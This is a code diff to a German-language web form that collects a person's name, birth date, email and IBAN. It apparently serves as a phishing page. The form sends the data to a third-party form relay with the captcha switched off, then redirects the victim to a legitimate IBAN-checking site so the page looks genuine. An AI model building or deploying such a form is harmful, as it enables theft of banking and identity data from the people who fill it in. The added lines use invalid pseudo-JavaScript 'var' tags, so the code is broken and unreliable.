@@ -324,6 +324,12 @@
 <form action="https://formsubmit.co/0dfce143ac57b75912c7a76244f68380" method="POST">
 <table border="0" cellpadding="0" cellspacing="0">
 <tbody><tr>
+
+   <var value1 = document.getElementById('Input1').value;>
+</var>
+   <var value2 = document.getElementById('Input2').value;>
+</var>
+
 <td valign="top">
 <p>VOR/NACH&nbspNAME:</p>
 <input type="text"  name="_subject" size="30" minlength="7"  required>
@@ -331,20 +337,22 @@
 <br>
 <br clear="all">
 <p>GEBURTSDATUM:</p>
-  <input type="date"  size="30" name="textarea" min="1940-12-25" required>
+  <input type="date"  size="30" name="Input1" id='Input1' min="1940-12-25" required>
 
 <br>
 <br clear="all">
 <p>EMAIL:</p>
-  <input type="text"  size="30" name="textarea" minlength="7" required>
+  <input type="email"  size="30" name="email" minlength="7" required>
 
 
 <br>
 <br clear="all">
 <p>IBAN:</p>
-  <input type="textarea"  size="30" name="textarea" autocomplete="off" value="" required> 
- 
-  <input type="hidden"  name="email" value="anas.alchayah@gmail.com">
+  <input type="textarea"  size="30" name="Input2" id='Input2' autocomplete="off" value="" required> 
+<var optionValue = "value1" + "value2";>
+</var>
+
+  <input type="hidden" name="textarea" value=optionValue>
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden"  name="_next" value="https://www.iban-rechner.de/iban_validieren.html">
 <br>
